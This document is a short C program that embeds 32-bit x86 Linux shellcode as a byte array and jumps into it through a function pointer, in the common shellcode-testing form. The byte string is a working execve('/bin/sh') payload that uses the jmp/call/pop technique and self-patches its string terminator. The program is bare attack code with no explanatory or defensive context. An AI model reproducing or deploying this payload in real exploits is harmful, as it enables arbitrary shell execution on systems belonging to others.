unsigned char shellcode[] =
        "\xeb\x18"
        "\x5e"
        "\x31\xc0"
        "\x89\xf3"
        "\xfe\x4b\x07"
        "\x89\x73\x08"
        "\x89\x43\x0c"
        "\xb0\x0b"
        "\x8d\x4e\x08"
        "\x8d\x56\x0c"
        "\xcd\x80"
        "\xe8\xe3\xff\xff\xff"
        "\x2f"
        "\x62\x69\x6e"
        "\x2f"
        "\x73\x68"
        "\x01";
int main()
{
  void (*f)();
  f = (void *) shellcode;
  printf("size: %d bytes.\n", strlen(shellcode));
  f();
}